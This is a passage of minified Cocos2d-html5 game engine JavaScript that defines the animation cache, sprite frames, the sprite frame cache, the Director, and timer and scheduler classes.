	return new cc.Animation(a, b, c)
};
cc.animationCache = {
	_animations: {},
	addAnimation: function(a, b) {
		this._animations[b] = a
	},
	removeAnimation: function(a) {
		a && this._animations[a] && delete this._animations[a]
	},
	getAnimation: function(a) {
		return this._animations[a] ? this._animations[a] : null
	},
	_addAnimationsWithDictionary: function(a, b) {
		var c = a.animations;
		if (c) {
			var d = 1,
				e = a.properties;
			if (e) for (var d = null != e.format ? parseInt(e.format) : d, e = e.spritesheets, f = cc.spriteFrameCache, g = cc.path, h = 0; h < e.length; h++) f.addSpriteFrames(g.changeBasename(b, e[h]));
			switch (d) {
			case 1:
				this._parseVersion1(c);
				break;
			case 2:
				this._parseVersion2(c);
				break;
			default:
				cc.log(cc._LogInfos.animationCache__addAnimationsWithDictionary_2)
			}
		} else cc.log(cc._LogInfos.animationCache__addAnimationsWithDictionary)
	},
	addAnimations: function(a) {
		cc.assert(a, cc._LogInfos.animationCache_addAnimations_2);
		var b = cc.loader.getRes(a);
		b ? this._addAnimationsWithDictionary(b, a) : cc.log(cc._LogInfos.animationCache_addAnimations)
	},
	_parseVersion1: function(a) {
		var b = cc.spriteFrameCache,
			c;
		for (c in a) {
			var d = a[c],
				e = d.frames,
				d = parseFloat(d.delay) || 0,
				f = null;
			if (e) {
				for (var f = [], g = 0; g < e.length; g++) {
					var h = b.getSpriteFrame(e[g]);
					if (h) {
						var k = new cc.AnimationFrame;
						k.initWithSpriteFrame(h, 1, null);
						f.push(k)
					} else cc.log(cc._LogInfos.animationCache__parseVersion1_2, c, e[g])
				}
				0 === f.length ? cc.log(cc._LogInfos.animationCache__parseVersion1_3, c) : (f.length != e.length && cc.log(cc._LogInfos.animationCache__parseVersion1_4, c), f = cc.Animation.create(f, d, 1), cc.animationCache.addAnimation(f, c))
			} else cc.log(cc._LogInfos.animationCache__parseVersion1, c)
		}
	},
	_parseVersion2: function(a) {
		var b = cc.spriteFrameCache,
			c;
		for (c in a) {
			var d = a[c],
				e = d.loop,
				f = parseInt(d.loops),
				e = e ? cc.REPEAT_FOREVER : isNaN(f) ? 1 : f,
				f = d.restoreOriginalFrame && !0 == d.restoreOriginalFrame ? !0 : !1,
				g = d.frames;
			if (g) {
				for (var h = [], k = 0; k < g.length; k++) {
					var l = g[k],
						m = l.spriteframe,
						n = b.getSpriteFrame(m);
					if (n) {
						var m = parseFloat(l.delayUnits) || 0,
							l = l.notification,
							q = new cc.AnimationFrame;
						q.initWithSpriteFrame(n, m, l);
						h.push(q)
					} else cc.log(cc._LogInfos.animationCache__parseVersion2_2, c, m)
				}
				d = parseFloat(d.delayPerUnit) || 0;
				g = new cc.Animation;
				g.initWithAnimationFrames(h, d, e);
				g.setRestoreOriginalFrame(f);
				cc.animationCache.addAnimation(g, c)
			} else cc.log(cc._LogInfos.animationCache__parseVersion2, c)
		}
	},
	_clear: function() {
		this._animations = {}
	}
};
cc.SpriteFrame = cc.Class.extend({
	_offset: null,
	_originalSize: null,
	_rectInPixels: null,
	_rotated: !1,
	_rect: null,
	_offsetInPixels: null,
	_originalSizeInPixels: null,
	_texture: null,
	_textureFilename: "",
	_textureLoaded: !1,
	_eventListeners: null,
	ctor: function(a, b, c, d, e) {
		this._offset = cc.p(0, 0);
		this._offsetInPixels = cc.p(0, 0);
		this._originalSize = cc.size(0, 0);
		this._rotated = !1;
		this._originalSizeInPixels = cc.size(0, 0);
		this._textureFilename = "";
		this._texture = null;
		this._textureLoaded = !1;
		void 0 !== a && void 0 !== b && (void 0 === c || void 0 === d || void 0 === e ? this.initWithTexture(a, b) : this.initWithTexture(a, b, c, d, e))
	},
	textureLoaded: function() {
		return this._textureLoaded
	},
	addLoadedEventListener: function(a, b) {
		null == this._eventListeners && (this._eventListeners = []);
		this._eventListeners.push({
			eventCallback: a,
			eventTarget: b
		})
	},
	_callLoadedEventCallbacks: function() {
		var a = this._eventListeners;
		if (a) {
			for (var b = 0, c = a.length; b < c; b++) {
				var d = a[b];
				d.eventCallback.call(d.eventTarget, this)
			}
			a.length = 0
		}
	},
	getRectInPixels: function() {
		var a = this._rectInPixels;
		return cc.rect(a.x, a.y, a.width, a.height)
	},
	setRectInPixels: function(a) {
		this._rectInPixels || (this._rectInPixels = cc.rect(0, 0, 0, 0));
		this._rectInPixels.x = a.x;
		this._rectInPixels.y = a.y;
		this._rectInPixels.width = a.width;
		this._rectInPixels.height = a.height;
		this._rect = cc.rectPixelsToPoints(a)
	},
	isRotated: function() {
		return this._rotated
	},
	setRotated: function(a) {
		this._rotated = a
	},
	getRect: function() {
		var a = this._rect;
		return cc.rect(a.x, a.y, a.width, a.height)
	},
	setRect: function(a) {
		this._rect || (this._rect = cc.rect(0, 0, 0, 0));
		this._rect.x = a.x;
		this._rect.y = a.y;
		this._rect.width = a.width;
		this._rect.height = a.height;
		this._rectInPixels = cc.rectPointsToPixels(this._rect)
	},
	getOffsetInPixels: function() {
		return this._offsetInPixels
	},
	setOffsetInPixels: function(a) {
		this._offsetInPixels.x = a.x;
		this._offsetInPixels.y = a.y;
		cc._pointPixelsToPointsOut(this._offsetInPixels, this._offset)
	},
	getOriginalSizeInPixels: function() {
		return this._originalSizeInPixels
	},
	setOriginalSizeInPixels: function(a) {
		this._originalSizeInPixels.width = a.width;
		this._originalSizeInPixels.height = a.height
	},
	getOriginalSize: function() {
		return this._originalSize
	},
	setOriginalSize: function(a) {
		this._originalSize.width = a.width;
		this._originalSize.height = a.height
	},
	getTexture: function() {
		if (this._texture) return this._texture;
		if ("" !== this._textureFilename) {
			var a = cc.textureCache.addImage(this._textureFilename);
			a && (this._textureLoaded = a.isLoaded());
			return a
		}
		return null
	},
	setTexture: function(a) {
		if (this._texture != a) {
			var b = a.isLoaded();
			this._textureLoaded = b;
			this._texture = a;
			b || a.addLoadedEventListener(function(a) {
				this._textureLoaded = !0;
				if (this._rotated && cc._renderType === cc._RENDER_TYPE_CANVAS) {
					var b = a.getHtmlElementObj(),
						b = cc.cutRotateImageToCanvas(b, this.getRect()),
						e = new cc.Texture2D;
					e.initWithElement(b);
					e.handleLoadedTexture();
					this.setTexture(e);
					b = this.getRect();
					this.setRect(cc.rect(0, 0, b.width, b.height))
				}
				b = this._rect;
				0 === b.width && 0 === b.height && (b = a.width, a = a.height, this._rect.width = b, this._rect.height = a, this._rectInPixels = cc.rectPointsToPixels(this._rect), this._originalSizeInPixels.width = this._rectInPixels.width, this._originalSizeInPixels.height = this._rectInPixels.height, this._originalSize.width = b, this._originalSize.height = a);
				this._callLoadedEventCallbacks()
			}, this)
		}
	},
	getOffset: function() {
		return this._offset
	},
	setOffset: function(a) {
		this._offset.x = a.x;
		this._offset.y = a.y
	},
	clone: function() {
		var a = new cc.SpriteFrame;
		a.initWithTexture(this._textureFilename, this._rectInPixels, this._rotated, this._offsetInPixels, this._originalSizeInPixels);
		a.setTexture(this._texture);
		return a
	},
	copyWithZone: function() {
		var a = new cc.SpriteFrame;
		a.initWithTexture(this._textureFilename, this._rectInPixels, this._rotated, this._offsetInPixels, this._originalSizeInPixels);
		a.setTexture(this._texture);
		return a
	},
	copy: function() {
		return this.copyWithZone()
	},
	initWithTexture: function(a, b, c, d, e) {
		2 === arguments.length && (b = cc.rectPointsToPixels(b));
		d = d || cc.p(0, 0);
		e = e || b;
		c = c || !1;
		"string" == typeof a ? (this._texture = null, this._textureFilename = a) : a instanceof cc.Texture2D && this.setTexture(a);
		if (a = this.getTexture()) {
			var f, g;
			c ? (f = b.x + b.height, g = b.y + b.width) : (f = b.x + b.width, g = b.y + b.height);
			f > a.width && cc.error(cc._LogInfos.RectWidth, a.url);
			g > a.height && cc.error(cc._LogInfos.RectHeight, a.url)
		}
		this._rectInPixels = b;
		this._rect = cc.rectPixelsToPoints(b);
		this._offsetInPixels.x = d.x;
		this._offsetInPixels.y = d.y;
		cc._pointPixelsToPointsOut(d, this._offset);
		this._originalSizeInPixels.width = e.width;
		this._originalSizeInPixels.height = e.height;
		cc._sizePixelsToPointsOut(e, this._originalSize);
		this._rotated = c;
		return !0
	}
});
cc.SpriteFrame.create = function(a, b, c, d, e) {
	return new cc.SpriteFrame(a, b, c, d, e)
};
cc.SpriteFrame._frameWithTextureForCanvas = function(a, b, c, d, e) {
	var f = new cc.SpriteFrame;
	f._texture = a;
	f._rectInPixels = b;
	f._rect = cc.rectPixelsToPoints(b);
	f._offsetInPixels.x = d.x;
	f._offsetInPixels.y = d.y;
	cc._pointPixelsToPointsOut(f._offsetInPixels, f._offset);
	f._originalSizeInPixels.width = e.width;
	f._originalSizeInPixels.height = e.height;
	cc._sizePixelsToPointsOut(f._originalSizeInPixels, f._originalSize);
	f._rotated = c;
	return f
};
cc.spriteFrameCache = {
	_CCNS_REG1: /^\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*$/,
	_CCNS_REG2: /^\s*\{\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*,\s*\{\s*([\-]?\d+[.]?\d*)\s*,\s*([\-]?\d+[.]?\d*)\s*\}\s*\}\s*$/,
	_spriteFrames: {},
	_spriteFramesAliases: {},
	_frameConfigCache: {},
	_rectFromString: function(a) {
		a = this._CCNS_REG2.exec(a);
		return !a ? cc.rect(0, 0, 0, 0) : cc.rect(parseFloat(a[1]), parseFloat(a[2]), parseFloat(a[3]), parseFloat(a[4]))
	},
	_pointFromString: function(a) {
		a = this._CCNS_REG1.exec(a);
		return !a ? cc.p(0, 0) : cc.p(parseFloat(a[1]), parseFloat(a[2]))
	},
	_sizeFromString: function(a) {
		a = this._CCNS_REG1.exec(a);
		return !a ? cc.size(0, 0) : cc.size(parseFloat(a[1]), parseFloat(a[2]))
	},
	_getFrameConfig: function(a) {
		var b = cc.loader.getRes(a);
		cc.assert(b, cc._LogInfos.spriteFrameCache__getFrameConfig_2, a);
		cc.loader.release(a);
		if (b._inited) return this._frameConfigCache[a] = b;
		var c = b.frames,
			d = b.metadata || b.meta,
			b = {},
			e = {},
			f = 0;
		d && (f = d.format, f = 1 >= f.length ? parseInt(f) : f, e.image = d.textureFileName || d.textureFileName || d.image);
		for (var g in c) {
			var h = c[g];
			if (h) {
				d = {};
				if (0 == f) {
					d.rect = cc.rect(h.x, h.y, h.width, h.height);
					d.rotated = !1;
					d.offset = cc.p(h.offsetX, h.offsetY);
					var k = h.originalWidth,
						h = h.originalHeight;
					(!k || !h) && cc.log(cc._LogInfos.spriteFrameCache__getFrameConfig);
					k = Math.abs(k);
					h = Math.abs(h);
					d.size = cc.size(k, h)
				} else if (1 == f || 2 == f) d.rect = this._rectFromString(h.frame), d.rotated = h.rotated || !1, d.offset = this._pointFromString(h.offset), d.size = this._sizeFromString(h.sourceSize);
				else if (3 == f) {
					var k = this._sizeFromString(h.spriteSize),
						l = this._rectFromString(h.textureRect);
					k && (l = cc.rect(l.x, l.y, k.width, k.height));
					d.rect = l;
					d.rotated = h.textureRotated || !1;
					d.offset = this._pointFromString(h.spriteOffset);
					d.size = this._sizeFromString(h.spriteSourceSize);
					d.aliases = h.aliases
				} else k = h.frame, l = h.sourceSize, g = h.filename || g, d.rect = cc.rect(k.x, k.y, k.w, k.h), d.rotated = h.rotated || !1, d.offset = cc.p(0, 0), d.size = cc.size(l.w, l.h);
				b[g] = d
			}
		}
		return this._frameConfigCache[a] = {
			_inited: !0,
			frames: b,
			meta: e
		}
	},
	addSpriteFrames: function(a, b) {
		cc.assert(a, cc._LogInfos.spriteFrameCache_addSpriteFrames_2);
		var c = this._frameConfigCache[a] || cc.loader.getRes(a);
		if (c && c.frames) {
			var d = this._frameConfigCache[a] || this._getFrameConfig(a),
				c = d.frames,
				d = d.meta;
			b ? b instanceof cc.Texture2D || ("string" == typeof b ? b = cc.textureCache.addImage(b) : cc.assert(0, cc._LogInfos.spriteFrameCache_addSpriteFrames_3)) : (d = cc.path.changeBasename(a, d.image || ".png"), b = cc.textureCache.addImage(d));
			var d = this._spriteFramesAliases,
				e = this._spriteFrames,
				f;
			for (f in c) {
				var g = c[f],
					h = e[f];
				if (!h) {
					h = cc.SpriteFrame.create(b, g.rect, g.rotated, g.offset, g.size);
					if (g = g.aliases) for (var k = 0, l = g.length; k < l; k++) {
						var m = g[k];
						d[m] && cc.log(cc._LogInfos.spriteFrameCache_addSpriteFrames, m);
						d[m] = f
					}
					cc._renderType === cc._RENDER_TYPE_CANVAS && h.isRotated() && h.getTexture().isLoaded() && (g = h.getTexture().getHtmlElementObj(), g = cc.cutRotateImageToCanvas(g, h.getRectInPixels()), k = new cc.Texture2D, k.initWithElement(g), k.handleLoadedTexture(), h.setTexture(k), g = h._rect, h.setRect(cc.rect(0, 0, g.width, g.height)));
					e[f] = h
				}
			}
		}
	},
	_checkConflict: function(a) {
		a = a.frames;
		for (var b in a) this._spriteFrames[b] && cc.log(cc._LogInfos.spriteFrameCache__checkConflict, b)
	},
	addSpriteFrame: function(a, b) {
		this._spriteFrames[b] = a
	},
	removeSpriteFrames: function() {
		this._spriteFrames = {};
		this._spriteFramesAliases = {}
	},
	removeSpriteFrameByName: function(a) {
		a && (this._spriteFramesAliases[a] && delete this._spriteFramesAliases[a], this._spriteFrames[a] && delete this._spriteFrames[a])
	},
	removeSpriteFramesFromFile: function(a) {
		var b = this._spriteFrames,
			c = this._spriteFramesAliases;
		if (a = this._frameConfigCache[a]) {
			a = a.frames;
			for (var d in a) if (b[d]) {
				delete b[d];
				for (var e in c) c[e] == d && delete c[e]
			}
		}
	},
	removeSpriteFramesFromTexture: function(a) {
		var b = this._spriteFrames,
			c = this._spriteFramesAliases,
			d;
		for (d in b) {
			var e = b[d];
			if (e && e.getTexture() == a) {
				delete b[d];
				for (var f in c) c[f] == d && delete c[f]
			}
		}
	},
	getSpriteFrame: function(a) {
		var b = this._spriteFrames[a];
		if (!b) {
			var c = this._spriteFramesAliases[a];
			c && ((b = this._spriteFrames[c.toString()]) || delete this._spriteFramesAliases[a])
		}
		b || cc.log(cc._LogInfos.spriteFrameCache_getSpriteFrame, a);
		return b
	},
	_clear: function() {
		this._spriteFrames = {};
		this._spriteFramesAliases = {};
		this._frameConfigCache = {}
	}
};
cc.g_NumberOfDraws = 0;
cc.GLToClipTransform = function(a) {
	var b = new cc.kmMat4;
	cc.kmGLGetMatrix(cc.KM_GL_PROJECTION, b);
	var c = new cc.kmMat4;
	cc.kmGLGetMatrix(cc.KM_GL_MODELVIEW, c);
	cc.kmMat4Multiply(a, b, c)
};
cc.Director = cc.Class.extend({
	_landscape: !1,
	_nextDeltaTimeZero: !1,
	_paused: !1,
	_purgeDirectorInNextLoop: !1,
	_sendCleanupToScene: !1,
	_animationInterval: 0,
	_oldAnimationInterval: 0,
	_projection: 0,
	_accumDt: 0,
	_contentScaleFactor: 1,
	_displayStats: !1,
	_deltaTime: 0,
	_frameRate: 0,
	_FPSLabel: null,
	_SPFLabel: null,
	_drawsLabel: null,
	_winSizeInPoints: null,
	_lastUpdate: null,
	_nextScene: null,
	_notificationNode: null,
	_openGLView: null,
	_scenesStack: null,
	_projectionDelegate: null,
	_runningScene: null,
	_frames: 0,
	_totalFrames: 0,
	_secondsPerFrame: 0,
	_dirtyRegion: null,
	_scheduler: null,
	_actionManager: null,
	_eventProjectionChanged: null,
	_eventAfterDraw: null,
	_eventAfterVisit: null,
	_eventAfterUpdate: null,
	ctor: function() {
		var a = this;
		a._lastUpdate = Date.now();
		cc.eventManager.addCustomListener(cc.game.EVENT_SHOW, function() {
			a._lastUpdate = Date.now()
		})
	},
	init: function() {
		this._oldAnimationInterval = this._animationInterval = 1 / cc.defaultFPS;
		this._scenesStack = [];
		this._projection = cc.Director.PROJECTION_DEFAULT;
		this._projectionDelegate = null;
		this._frameRate = this._accumDt = 0;
		this._displayStats = !1;
		this._totalFrames = this._frames = 0;
		this._lastUpdate = Date.now();
		this._purgeDirectorInNextLoop = this._paused = !1;
		this._winSizeInPoints = cc.size(0, 0);
		this._openGLView = null;
		this._contentScaleFactor = 1;
		this._scheduler = new cc.Scheduler;
		this._actionManager = cc.ActionManager ? new cc.ActionManager : null;
		this._scheduler.scheduleUpdateForTarget(this._actionManager, cc.Scheduler.PRIORITY_SYSTEM, !1);
		this._eventAfterDraw = new cc.EventCustom(cc.Director.EVENT_AFTER_DRAW);
		this._eventAfterDraw.setUserData(this);
		this._eventAfterVisit = new cc.EventCustom(cc.Director.EVENT_AFTER_VISIT);
		this._eventAfterVisit.setUserData(this);
		this._eventAfterUpdate = new cc.EventCustom(cc.Director.EVENT_AFTER_UPDATE);
		this._eventAfterUpdate.setUserData(this);
		this._eventProjectionChanged = new cc.EventCustom(cc.Director.EVENT_PROJECTION_CHANGED);
		this._eventProjectionChanged.setUserData(this);
		return !0
	},
	calculateDeltaTime: function() {
		var a = Date.now();
		this._nextDeltaTimeZero ? (this._deltaTime = 0, this._nextDeltaTimeZero = !1) : this._deltaTime = (a - this._lastUpdate) / 1E3;
		0 < cc.game.config[cc.game.CONFIG_KEY.debugMode] && 0.2 < this._deltaTime && (this._deltaTime = 1 / 60);
		this._lastUpdate = a
	},
	drawScene: function() {
		this.calculateDeltaTime();
		this._paused || (this._scheduler.update(this._deltaTime), cc.eventManager.dispatchEvent(this._eventAfterUpdate));
		this._clear();
		this._nextScene && this.setNextScene();
		this._beforeVisitScene && this._beforeVisitScene();
		this._runningScene && (this._runningScene.visit(), cc.eventManager.dispatchEvent(this._eventAfterVisit));
		this._notificationNode && this._notificationNode.visit();
		this._displayStats && this._showStats();
		this._afterVisitScene && this._afterVisitScene();
		cc.eventManager.dispatchEvent(this._eventAfterDraw);
		this._totalFrames++;
		this._displayStats && this._calculateMPF()
	},
	_beforeVisitScene: null,
	_afterVisitScene: null,
	end: function() {
		this._purgeDirectorInNextLoop = !0
	},
	getContentScaleFactor: function() {
		return this._contentScaleFactor
	},
	getNotificationNode: function() {
		return this._notificationNode
	},
	getWinSize: function() {
		return this._winSizeInPoints
	},
	getWinSizeInPixels: function() {
		return cc.size(this._winSizeInPoints.width * this._contentScaleFactor, this._winSizeInPoints.height * this._contentScaleFactor)
	},
	pause: function() {
		this._paused || (this._oldAnimationInterval = this._animationInterval, this.setAnimationInterval(0.25), this._paused = !0)
	},
	popScene: function() {
		cc.assert(this._runningScene, cc._LogInfos.Director_popScene);
		this._scenesStack.pop();
		var a = this._scenesStack.length;
		0 == a ? this.end() : (this._sendCleanupToScene = !0, this._nextScene = this._scenesStack[a - 1])
	},
	purgeCachedData: function() {
		cc.animationCache._clear();
		cc.spriteFrameCache._clear();
		cc.textureCache._clear()
	},
	purgeDirector: function() {
		this.getScheduler().unscheduleAllCallbacks();
		cc.eventManager && cc.eventManager.setEnabled(!1);
		this._runningScene && (this._runningScene.onExitTransitionDidStart(), this._runningScene.onExit(), this._runningScene.cleanup());
		this._nextScene = this._runningScene = null;
		this._scenesStack.length = 0;
		this.stopAnimation();
		this.purgeCachedData();
		cc.checkGLErrorDebug()
	},
	pushScene: function(a) {
		cc.assert(a, cc._LogInfos.Director_pushScene);
		this._sendCleanupToScene = !1;
		this._scenesStack.push(a);
		this._nextScene = a
	},
	runScene: function(a) {
		cc.assert(a, cc._LogInfos.Director_pushScene);
		if (this._runningScene) {
			var b = this._scenesStack.length;
			0 === b ? (this._sendCleanupToScene = !0, this._scenesStack[b] = a) : (this._sendCleanupToScene = !0, this._scenesStack[b - 1] = a);
			this._nextScene = a
		} else this.pushScene(a), this.startAnimation()
	},
	resume: function() {
		this._paused && (this.setAnimationInterval(this._oldAnimationInterval), (this._lastUpdate = Date.now()) || cc.log(cc._LogInfos.Director_resume), this._paused = !1, this._deltaTime = 0)
	},
	setContentScaleFactor: function(a) {
		a != this._contentScaleFactor && (this._contentScaleFactor = a, this._createStatsLabel())
	},
	setDefaultValues: function() {},
	setNextDeltaTimeZero: function(a) {
		this._nextDeltaTimeZero = a
	},
	setNextScene: function() {
		var a = !1,
			b = !1;
		cc.TransitionScene && (a = this._runningScene ? this._runningScene instanceof cc.TransitionScene : !1, b = this._nextScene ? this._nextScene instanceof cc.TransitionScene : !1);
		if (!b) {
			if (b = this._runningScene) b.onExitTransitionDidStart(), b.onExit();
			this._sendCleanupToScene && b && b.cleanup()
		}
		this._runningScene = this._nextScene;
		this._nextScene = null;
		!a && null != this._runningScene && (this._runningScene.onEnter(), this._runningScene.onEnterTransitionDidFinish())
	},
	setNotificationNode: function(a) {
		this._notificationNode = a
	},
	getDelegate: function() {
		return this._projectionDelegate
	},
	setDelegate: function(a) {
		this._projectionDelegate = a
	},
	_showStats: function() {
		this._frames++;
		this._accumDt += this._deltaTime;
		this._FPSLabel && this._SPFLabel && this._drawsLabel ? (this._accumDt > cc.DIRECTOR_FPS_INTERVAL && (this._SPFLabel.string = this._secondsPerFrame.toFixed(3), this._frameRate = this._frames / this._accumDt, this._accumDt = this._frames = 0, this._FPSLabel.string = this._frameRate.toFixed(1), this._drawsLabel.string = (0 | cc.g_NumberOfDraws).toString()), this._FPSLabel.visit(), this._SPFLabel.visit(), this._drawsLabel.visit()) : this._createStatsLabel();
		cc.g_NumberOfDraws = 0
	},
	isSendCleanupToScene: function() {
		return this._sendCleanupToScene
	},
	getRunningScene: function() {
		return this._runningScene
	},
	getAnimationInterval: function() {
		return this._animationInterval
	},
	isDisplayStats: function() {
		return this._displayStats
	},
	setDisplayStats: function(a) {
		this._displayStats = a
	},
	getSecondsPerFrame: function() {
		return this._secondsPerFrame
	},
	isNextDeltaTimeZero: function() {
		return this._nextDeltaTimeZero
	},
	isPaused: function() {
		return this._paused
	},
	getTotalFrames: function() {
		return this._totalFrames
	},
	popToRootScene: function() {
		this.popToSceneStackLevel(1)
	},
	popToSceneStackLevel: function(a) {
		cc.assert(this._runningScene, cc._LogInfos.Director_popToSceneStackLevel_2);
		var b = this._scenesStack,
			c = b.length;
		if (0 == c) this.end();
		else if (!(a > c)) {
			for (; c > a;) {
				var d = b.pop();
				d.running && (d.onExitTransitionDidStart(), d.onExit());
				d.cleanup();
				c--
			}
			this._nextScene = b[b.length - 1];
			this._sendCleanupToScene = !1
		}
	},
	getScheduler: function() {
		return this._scheduler
	},
	setScheduler: function(a) {
		this._scheduler != a && (this._scheduler = a)
	},
	getActionManager: function() {
		return this._actionManager
	},
	setActionManager: function(a) {
		this._actionManager != a && (this._actionManager = a)
	},
	getDeltaTime: function() {
		return this._deltaTime
	},
	_createStatsLabel: null,
	_calculateMPF: function() {
		this._secondsPerFrame = (Date.now() - this._lastUpdate) / 1E3
	}
});
cc.Director.EVENT_PROJECTION_CHANGED = "director_projection_changed";
cc.Director.EVENT_AFTER_DRAW = "director_after_draw";
cc.Director.EVENT_AFTER_VISIT = "director_after_visit";
cc.Director.EVENT_AFTER_UPDATE = "director_after_update";
cc.DisplayLinkDirector = cc.Director.extend({
	invalid: !1,
	startAnimation: function() {
		this._nextDeltaTimeZero = !0;
		this.invalid = !1
	},
	mainLoop: function() {
		this._purgeDirectorInNextLoop ? (this._purgeDirectorInNextLoop = !1, this.purgeDirector()) : this.invalid || this.drawScene()
	},
	stopAnimation: function() {
		this.invalid = !0
	},
	setAnimationInterval: function(a) {
		this._animationInterval = a;
		this.invalid || (this.stopAnimation(), this.startAnimation())
	}
});
cc.Director.sharedDirector = null;
cc.Director.firstUseDirector = !0;
cc.Director._getInstance = function() {
	cc.Director.firstUseDirector && (cc.Director.firstUseDirector = !1, cc.Director.sharedDirector = new cc.DisplayLinkDirector, cc.Director.sharedDirector.init());
	return cc.Director.sharedDirector
};
cc.defaultFPS = 60;
cc.Director.PROJECTION_2D = 0;
cc.Director.PROJECTION_3D = 1;
cc.Director.PROJECTION_CUSTOM = 3;
cc.Director.PROJECTION_DEFAULT = cc.Director.PROJECTION_3D;
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.Director.prototype, _p.setProjection = function(a) {
	this._projection = a;
	cc.eventManager.dispatchEvent(this._eventProjectionChanged)
}, _p.setDepthTest = function() {}, _p.setOpenGLView = function(a) {
	this._winSizeInPoints.width = cc._canvas.width;
	this._winSizeInPoints.height = cc._canvas.height;
	this._openGLView = a || cc.view;
	cc.eventManager && cc.eventManager.setEnabled(!0)
}, _p._clear = function() {
	var a = this._openGLView.getViewPortRect();
	cc._renderContext.clearRect(-a.x, a.y, a.width, -a.height)
}, _p._createStatsLabel = function() {
	var a = 0,
		a = this._winSizeInPoints.width > this._winSizeInPoints.height ? 0 | 24 * (this._winSizeInPoints.height / 320) : 0 | 24 * (this._winSizeInPoints.width / 320);
	this._FPSLabel = cc.LabelTTF.create("000.0", "Arial", a);
	this._SPFLabel = cc.LabelTTF.create("0.000", "Arial", a);
	this._drawsLabel = cc.LabelTTF.create("0000", "Arial", a);
	a = cc.DIRECTOR_STATS_POSITION;
	this._drawsLabel.setPosition(this._drawsLabel.width / 2 + a.x, 5 * this._drawsLabel.height / 2 + a.y);
	this._SPFLabel.setPosition(this._SPFLabel.width / 2 + a.x, 3 * this._SPFLabel.height / 2 + a.y);
	this._FPSLabel.setPosition(this._FPSLabel.width / 2 + a.x, this._FPSLabel.height / 2 + a.y)
}, _p.getVisibleSize = function() {
	return this.getWinSize()
}, _p.getVisibleOrigin = function() {
	return cc.p(0, 0)
}) : (cc.Director._fpsImage = new Image, cc._addEventListener(cc.Director._fpsImage, "load", function() {
	cc.Director._fpsImageLoaded = !0
}), cc._fpsImage && (cc.Director._fpsImage.src = cc._fpsImage), cc.assert("function" === typeof cc._tmp.DirectorWebGL, cc._LogInfos.MissingFile, "CCDirectorWebGL.js"), cc._tmp.DirectorWebGL(), delete cc._tmp.DirectorWebGL);
cc.PRIORITY_NON_SYSTEM = cc.PRIORITY_SYSTEM + 1;
cc.arrayVerifyType = function(a, b) {
	if (a && 0 < a.length) for (var c = 0; c < a.length; c++) if (!(a[c] instanceof b)) return cc.log(cc._LogInfos.arrayVerifyType), !1;
	return !0
};
cc.arrayRemoveObject = function(a, b) {
	for (var c = 0, d = a.length; c < d; c++) if (a[c] == b) {
		a.splice(c, 1);
		break
	}
};
cc.arrayRemoveArray = function(a, b) {
	for (var c = 0, d = b.length; c < d; c++) cc.arrayRemoveObject(a, b[c])
};
cc.arrayAppendObjectsToIndex = function(a, b, c) {
	a.splice.apply(a, [c, 0].concat(b));
	return a
};
cc.ListEntry = function(a, b, c, d, e, f) {
	this.prev = a;
	this.next = b;
	this.target = c;
	this.priority = d;
	this.paused = e;
	this.markedForDeletion = f
};
cc.HashUpdateEntry = function(a, b, c, d) {
	this.list = a;
	this.entry = b;
	this.target = c;
	this.hh = d
};
cc.HashTimerEntry = function(a, b, c, d, e, f, g) {
	this.timers = a;
	this.target = b;
	this.timerIndex = c;
	this.currentTimer = d;
	this.currentTimerSalvaged = e;
	this.paused = f;
	this.hh = g
};
cc.Timer = cc.Class.extend({
	_interval: 0,
	_callback: null,
	_target: null,
	_elapsed: 0,
	_runForever: !1,
	_useDelay: !1,
	_timesExecuted: 0,
	_repeat: 0,
	_delay: 0,
	getInterval: function() {
		return this._interval
	},
	setInterval: function(a) {
		this._interval = a
	},
	getCallback: function() {
		return this._callback
	},
	ctor: function(a, b, c, d, e) {
		this._target = a;
		this._callback = b;
		this._elapsed = -1;
		this._interval = c || 0;
		this._delay = e || 0;
		this._useDelay = 0 < this._delay;
		this._repeat = null == d ? cc.REPEAT_FOREVER : d;
		this._runForever = this._repeat == cc.REPEAT_FOREVER
	},
	_doCallback: function() {
		if ("string" == typeof this._callback) this._target[this._callback](this._elapsed);
		else this._callback.call(this._target, this._elapsed)
	},
	update: function(a) {
		if (-1 == this._elapsed) this._timesExecuted = this._elapsed = 0;
		else {
			var b = this._target,
				c = this._callback;
			this._elapsed += a;
			this._runForever && !this._useDelay ? this._elapsed >= this._interval && (b && c && this._doCallback(), this._elapsed = 0) : (this._useDelay ? this._elapsed >= this._delay && (b && c && this._doCallback(), this._elapsed -= this._delay, this._timesExecuted += 1, this._useDelay = !1) : this._elapsed >= this._interval && (b && c && this._doCallback(), this._elapsed = 0, this._timesExecuted += 1), this._timesExecuted > this._repeat && cc.director.getScheduler().unscheduleCallbackForTarget(b, c))
		}
	}
});
cc.Scheduler = cc.Class.extend({
	_timeScale: 1,
	_updates: null,
	_hashForUpdates: null,
	_arrayForUpdates: null,
	_hashForTimers: null,
	_arrayForTimes: null,
	_currentTarget: null,
	_currentTargetSalvaged: !1,
	_updateHashLocked: !1,
	ctor: function() {
		this._timeScale = 1;
		this._updates = [
			[],
			[],
			[]
		];
		this._hashForUpdates = {};
		this._arrayForUpdates = [];
		this._hashForTimers = {};
		this._arrayForTimers = [];
		this._currentTarget = null;
		this._updateHashLocked = this._currentTargetSalvaged = !1
	},
	_removeHashElement: function(a) {
		delete this._hashForTimers[a.target.__instanceId];
		cc.arrayRemoveObject(this._arrayForTimers, a);
		a.Timer = null;
		a.target = null
	},
	_removeUpdateFromHash: function(a) {
		if (a = this._hashForUpdates[a.target.__instanceId]) cc.arrayRemoveObject(a.list, a.entry), delete this._hashForUpdates[a.target.__instanceId], cc.arrayRemoveObject(this._arrayForUpdates, a), a.entry = null, a.target = null
	},
	_priorityIn: function(a, b, c, d) {
		d = new cc.ListEntry(null, null, b, c, d, !1);
		if (a) {
			for (var e = a.length - 1, f = 0; f <= e && !(c < a[f].priority); f++);
			a.splice(f, 0, d)
		} else a = [], a.push(d);
		c = new cc.HashUpdateEntry(a, d, b, null);
		this._arrayForUpdates.push(c);
		this._hashForUpdates[b.__instanceId] = c;
		return a
	},
	_appendIn: function(a, b, c) {
		c = new cc.ListEntry(null, null, b, 0, c, !1);
		a.push(c);
		a = new cc.HashUpdateEntry(a, c, b, null);
		this._arrayForUpdates.push(a);
		this._hashForUpdates[b.__instanceId] = a
	},
